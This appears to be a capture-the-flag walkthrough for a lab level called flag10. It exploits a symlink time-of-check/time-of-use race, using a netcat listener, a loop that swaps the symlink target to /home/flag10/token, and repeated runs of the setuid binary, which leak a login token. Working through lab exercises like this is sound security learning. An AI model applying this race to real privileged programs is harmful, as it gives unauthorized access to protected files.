You need 3 shells to implement a race condition on a symbolic link (symlink attackk)
All shells must in a working directory the user have write permission, like "/tmp"
# Shell 1
## open a TCP socket to listen to remote connection   
`nc -lk 18211|tee out`

# Shell 2
## 1 - create the file to be used for the race condition
`echo "here we go" > /tmp/token`
-----> the file "/tmp/token" is the one  we are going to use to try to fool the code with a symlink

## 2 - Constantly creates  a symlink between the file we wanna read and the file we use as bait

`while true; do ln -sf /home/flag10/token /tmp/test; ln -sf /tmp/token /tmp/test; done`
-----> an infinite loop that creates a symlink from "/home/flag10/token" to "/tmp/test" right after this , it creates a symlink from "/tmp/token" to "/tmp/test"
-----> switching between those files using a symlink can fool the "access" function that we have access to the restricted file "/home/flag10/token"

# Shell 3
## 1 - Constantly sends the symlink to the the remote connection openned 
`while true; do /home/flag10/flag10 /tmp/test 127.0.0.1; done`
-----> infinite loop to keep sending the symlink file

# **After seeing a content different, stop all 3 processes in the 3 shells**

## 1 - sort and remove duplicates from output file
`sort out | uniq`
**-----> which will output** 

```
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
Here I have full access.
.oO Oo.
```

we can use "615a2ce1-b2b5-4c76-8eed-8aa5c4015c27" as a password to login as user flag10

then you can run getflag